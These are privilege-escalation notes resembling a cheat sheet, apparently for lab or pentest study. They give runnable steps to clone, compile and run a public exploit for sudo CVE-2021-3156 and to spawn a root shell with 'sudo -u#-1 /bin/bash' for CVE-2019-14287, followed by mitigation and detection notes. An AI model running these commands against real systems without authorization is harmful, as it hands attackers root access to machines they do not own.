### Check sudo version
```bash
sudo -V | head -n1
```

## Check sudoers file (excluding comments and empty lines)
```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

### Check OS version
```bash
cat /etc/lsb-release # or cat /etc/os-release
```

### Clone exploit
```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
```

# Compile exploit
```bash
make
```

### Run exploit (replace <target_id> with the appropriate target ID)
```bash
./sudo-hax-me-a-sandwich <target_id>
```

### Verify root access
```bash
id
whoami
```

## Check sudo privileges
```bash
sudo -l
```

### Check user ID (if needed)
```bash
cat /etc/passwd | grep <username>
```

### Run command as root
```bash
sudo -u#-1 id
sudo -u#-1 /bin/bash # or /bin/sh
```

### Verify root access
```bash
id
whoami
```



**1. CVE-2021-3156 (Heap-Based Buffer Overflow):**

- **Vulnerability:**
    - Heap-based buffer overflow in `sudo`.
    - Affected versions: 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33), and others.
- **Exploitation:**
    - Requires a Proof-of-Concept (PoC) exploit.
    - Compile and run the exploit.
    - Select the appropriate target (OS version).
- **Mitigation:**
    - Update `sudo` to a patched version.
- **Commands:**
    - `sudo -V` (check `sudo` version)
    - `git clone https://github.com/blasty/CVE-2021-3156.git`
    - `make`
    - `./sudo-hax-me-a-sandwich <target_id>`
    - `cat /etc/lsb-release` (check OS version)

**2. CVE-2019-14287 (Sudo Policy Bypass):**

- **Vulnerability:**
    - Allows bypassing `sudo` policy restrictions.
    - Affected `sudo` versions below 1.8.28.
    - Requires the user to be allowed to run a specific command via sudo.
- **Exploitation:**
    - Use `sudo -u#-1 <command>` to run a command as root.
    - `-u#-1` is interpreted as `-u0` (root).
- **Mitigation:**
    - Update `sudo` to a patched version.
- **Commands:**
    - `sudo -l` (check `sudo` privileges)
    - `cat /etc/passwd | grep <username>` (check user ID)
    - `sudo -u#-1 id`

**Important Considerations and Enhancements:**

- **Vulnerability Severity:**
    - Both vulnerabilities are critical.
    - They allow unprivileged users to gain root access.
- **Patching:**
    - Keeping `sudo` updated is essential.
- **Sudo Configuration:**
    - Properly configuring `/etc/sudoers` is crucial.
- **Exploit Reliability:**
    - PoC exploits may require adjustments for specific systems.
- **Detection:**
    - Monitor `sudo` logs for suspicious activity.
    - Use intrusion detection systems.
- **Real world examples:** Researching real world sudo exploits will help solidify understanding of the attack vectors.
- **Sudoers file:** more detail could be given about the syntax of the sudoers file.
- **Nopasswd:** More detail could be given about the security implications of the NOPASSWD flag in the sudoers file.
